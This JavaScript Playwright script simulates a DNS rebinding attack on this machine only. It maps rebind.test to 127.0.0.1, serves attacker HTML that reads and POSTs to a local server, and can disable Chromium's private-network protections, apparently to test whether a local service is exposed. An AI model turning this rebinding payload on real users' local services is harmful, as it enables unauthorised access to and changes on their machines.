// Simulated DNS rebinding in real Chromium, isolated to this machine:
// - rebind.test always resolves to 127.0.0.1 (the "second" DNS answer, after the rebind);
// - Playwright serves the attacker HTML for the top-level page (the "first" answer).
// All later requests from the page are same-origin to http://rebind.test:<port> and reach our server.
// Playwright TIDAK ada di dependency repo. Set PLAYWRIGHT ke path index.js Playwright yang terpasang global.
const pw = (await import(process.env.PLAYWRIGHT ?? 'playwright')).default;
const [port, readPath, postPath, label] = process.argv.slice(2);
const origin = `http://rebind.test:${port}`;
const html = `<!doctype html><title>rebind</title><script>
(async () => {
  const r = {};
  try { const g = await fetch('${readPath}'); r.read = g.status + ' ' + (await g.text()).slice(0, 90); } catch (e) { r.read = 'error ' + e.message; }
  try { const p = await fetch('${postPath}', { method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ type: 'order_report', payload: { orderCount: 5, seed: 9 } }) });
        r.write = p.status + ' ' + (await p.text()).slice(0, 90); } catch (e) { r.write = 'error ' + e.message; }
  window.result = r;
})();
</script>`;
const b = await pw.chromium.launch({ args: ['--host-resolver-rules=MAP rebind.test 127.0.0.1', '--no-proxy-server',
  // NO_PNA=1: simulate browsers WITHOUT Private/Local Network Access (Firefox, Safari, older Chrome).
  ...(process.env.NO_PNA ? ['--disable-features=BlockInsecurePrivateNetworkRequests,PrivateNetworkAccessRespectPreflightResults,LocalNetworkAccessChecks'] : [])] });
const p = await b.newPage();
if (process.env.DEBUG) p.on('console', (m) => console.log('  console:', m.text().slice(0, 220)));
await p.route(`${origin}/`, (route) => route.fulfill({ status: 200, contentType: 'text/html', body: html }));
await p.goto(`${origin}/`);
await p.waitForFunction(() => window.result, null, { timeout: 10000 });
const r = await p.evaluate(() => window.result);
console.log(`[${label}] page origin ${origin} (browser PNA: ${process.env.NO_PNA ? 'OFF, simulating Firefox/Safari' : 'ON, Chromium default'})`);
console.log(`[${label}]   read : ${r.read}`);
console.log(`[${label}]   write: ${r.write}`);
await b.close();
